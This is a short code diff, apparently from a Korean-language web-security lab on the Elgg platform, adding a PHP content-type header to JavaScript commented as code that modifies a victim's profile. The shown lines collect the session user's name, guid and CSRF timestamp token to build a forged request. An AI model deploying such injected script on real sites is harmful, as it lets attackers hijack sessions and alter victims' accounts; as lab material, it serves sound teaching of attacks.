@@ -1,4 +1,5 @@
 // 피해자의 프로필을 수정하는 코드
+<?php header('Content-Type: application/javascript'); ?>
 var userName="&name="+elgg.session.user.name;
 var guid="&guid="+elgg.session.user.guid;
 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
